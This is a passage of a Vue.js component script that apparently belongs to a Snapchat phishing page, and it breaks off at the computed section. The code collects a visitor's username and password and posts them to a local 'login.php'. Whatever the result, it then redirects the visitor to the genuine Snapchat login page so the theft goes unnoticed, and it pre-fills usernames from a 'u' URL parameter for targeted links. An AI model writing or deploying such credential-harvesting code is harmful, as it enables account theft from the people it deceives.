<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      usernameError: false,
      passwordError: false,
      usernameEmptyError: false,
      passwordEmptyError: false,
      progressActive: false,
      referrerPage: "//accounts.snapchat.com/accounts/login",
      username: '',
      password: '',
      col1Expanded: false,
      col2Expanded: false,
      col3Expanded: false,
      col4Expanded: false
    }
  },
  methods: {
    submitForm () {
      let vm = this
      vm.usernameError = vm.username.length < 3
      vm.usernameEmptyError = vm.username.length == 0
      vm.passwordError = vm.password.length < 8
      vm.passwordEmptyError = vm.password.length == 0
      if (!vm.usernameError && !vm.usernameEmptyError && !vm.passwordError && !vm.passwordEmptyError) {
        axios.post('login.php', {username: vm.username, password: vm.password})
        .then(res => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
        .catch(error => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
      }
    },
    initiatePage () {
        let uri = window.location.href.split("?");
        if (uri.length > 0 && uri[1] !== undefined) {
            let vars = uri[1].split("&");
            let getVars = {};
            let tmp = "";
            vars.forEach(function(v) {
              tmp = v.split("=");
              if (tmp.length == 2)
                getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
            });
            this.username = "undefined" !== typeof getVars["u"] ? getVars["u"] : "";
        }
    }
  },
  computed: {
